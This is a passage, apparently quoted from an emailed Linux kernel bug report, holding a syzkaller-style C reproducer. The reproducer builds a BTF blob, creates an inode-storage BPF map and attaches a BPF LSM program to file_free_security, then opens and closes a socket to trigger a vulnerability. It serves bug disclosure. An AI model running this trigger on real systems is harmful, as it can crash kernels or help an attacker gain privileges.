>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D ((FUNC) - BPF_FUNC_unspec) })
>
>
> static unsigned long long procid;
> static inline uint64_t ptr_to_u64(const void *ptr) {
>     return (uint64_t)(unsigned long)ptr;
> }
>
>
> int create_btf_fd(){
>     *(uint64_t*)0x200000000100 =3D 0x200000000000;
>     *(uint16_t*)0x200000000000 =3D 0xeb9f;
>     *(uint8_t*)0x200000000002 =3D 1;
>     *(uint8_t*)0x200000000003 =3D 0;
>     *(uint32_t*)0x200000000004 =3D 0x18;
>     *(uint32_t*)0x200000000008 =3D 0;
>     *(uint32_t*)0x20000000000c =3D 0x1c;
>     *(uint32_t*)0x200000000010 =3D 0x1c;
>     *(uint32_t*)0x200000000014 =3D 2;
>     *(uint32_t*)0x200000000018 =3D 0;
>     *(uint16_t*)0x20000000001c =3D 0;
>     *(uint8_t*)0x20000000001e =3D 0;
>     *(uint8_t*)0x20000000001f =3D 1;
>     *(uint32_t*)0x200000000020 =3D 4;
>     *(uint8_t*)0x200000000024 =3D 0x20;
>     *(uint8_t*)0x200000000025 =3D 0;
>     *(uint8_t*)0x200000000026 =3D 0;
>     *(uint8_t*)0x200000000027 =3D 1;
>     *(uint32_t*)0x200000000028 =3D 1;
>     *(uint16_t*)0x20000000002c =3D 0;
>     *(uint8_t*)0x20000000002e =3D 0;
>     *(uint8_t*)0x20000000002f =3D 0x10;
>     *(uint32_t*)0x200000000030 =3D 8;
>     *(uint8_t*)0x200000000034 =3D 0;
>     *(uint8_t*)0x200000000035 =3D 0;
>     *(uint64_t*)0x200000000108 =3D 0;
>     *(uint32_t*)0x200000000110 =3D 0x36;
>     *(uint32_t*)0x200000000114 =3D 0;
>     *(uint32_t*)0x200000000118 =3D 1;
>     *(uint32_t*)0x20000000011c =3D 0;
>     *(uint32_t*)0x200000000120 =3D 0;
>     *(uint32_t*)0x200000000124 =3D 0;
>     int res =3D syscall(__NR_bpf, /*cmd=3D*/0x12ul, /*arg=3D*/0x200000000=
100ul, /*size=3D*/0x28ul);
>     return res;
> }
>
> int bpf_map_create(uint32_t map_type, uint32_t key_size, uint32_t value_s=
ize, unsigned int max_entries, unsigned int flags, unsigned int btf_id) {
>         union bpf_attr attr =3D {.map_type =3D map_type,
>         .key_size =3D key_size,
>         .value_size =3D value_size,
>         .max_entries =3D max_entries,
>         .map_flags =3D flags,
>         .map_extra =3D 0,
>         .btf_fd=3Dbtf_id,
>         .btf_key_type_id=3D1,
>         .btf_value_type_id=3D1,
>     };
>         return syscall(__NR_bpf, 0, &attr, 0x40);
> }
>
> static int load_prog(struct bpf_insn *insns, size_t cnt) {
>     int btf_id =3D 0; // change to valid btf of bpf_lsm_file_free_securit=
y
>     if(btf_id =3D=3D 0) {
>         printf("Btf id is not available! \n");
>         exit(0);
>     }
>
>     union bpf_attr attr =3D {
>         .prog_type =3D 0x1d,
>         .insns =3D ptr_to_u64(insns),
>         .insn_cnt =3D cnt,
>         .license =3D ptr_to_u64("GPL"),
>         .attach_btf_id =3D btf_id,
>         .expected_attach_type =3D BPF_LSM_MAC,
>         .log_level =3D 3,
>     };
>     int prog_fd=3Dsyscall(__NR_bpf, 5, &attr, sizeof(attr));
>     return prog_fd;
> }
>
> int link_create(int prog_fd, int target_fd, uint32_t attach_type)
> {
>         union bpf_attr attr =3D {
>                 .link_create.prog_fd =3D prog_fd,
>                 .link_create.target_fd =3D target_fd,
>                 .link_create.attach_type =3D attach_type,
>         };
>
>         return syscall(__NR_bpf, BPF_LINK_CREATE, &attr, sizeof(attr.link=
_create));
> }
>
> uint64_t r[4] =3D {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffff=
ffff, 0xffffffffffffffff};
>
> void execute_one(void)
> {
>         intptr_t res =3D 0;
>         if (write(1, "executing program\n", sizeof("executing program\n")=
 - 1)) {}
>
>         res =3D create_btf_fd();
>         if (res !=3D -1)
>                 r[0] =3D res;
>
>         res =3D bpf_map_create(0x1c, 4, 4, 0, 0x201, r[0]);
>         if (res !=3D -1)
>                 r[1] =3D res;
>         struct bpf_insn prog[] =3D {
>             BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_1, 0),
>             BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 96),
>             BPF_LD_MAP_FD(BPF_REG_1, r[1]),
>             BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
>             BPF_MOV64_IMM(BPF_REG_3, 0x0),
>             BPF_MOV64_IMM(BPF_REG_4, 0x1),
>             BPF_EMIT_CALL(BPF_FUNC_inode_storage_get),
>             BPF_MOV64_IMM(BPF_REG_0, 0x0),
>             BPF_EXIT_INSN()
>         };
>         res =3D load_prog(prog, sizeof(prog) / sizeof(prog[0]));
>         printf("loaded prog %ld\n", res);
>         if (res !=3D -1)
>             r[3] =3D res;
>         int link =3D link_create(r[3], 0, BPF_LSM_MAC);
>         int sock =3D socket(AF_INET, SOCK_STREAM, 0);
>         printf("created link %d and socket %d\n", link, sock);
>         close(sock);
>         printf("sock release done\n");
> }
> int main(void)
> {
>         syscall(__NR_mmap, /*addr=3D*/0x1ffffffff000ul, /*len=3D*/0x1000u=
l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         syscall(__NR_mmap, /*addr=3D*/0x200000000000ul, /*len=3D*/0x10000=
00ul, /*prot=3DPROT_WRITE|PROT_READ|PROT_EXEC*/7ul, /*flags=3DMAP_FIXED|MAP=
_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         syscall(__NR_mmap, /*addr=3D*/0x200001000000ul, /*len=3D*/0x1000u=
l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         for(int i=3D0;i<1;i++){
>                 execute_one();
>         }
>
>         return 0;
> }
>
> ```
>
>
> ## Kernel Configuration Requirements for Reproduction
>
> The vulnerability can be triggered with the kernel config in the attachme=
nt.

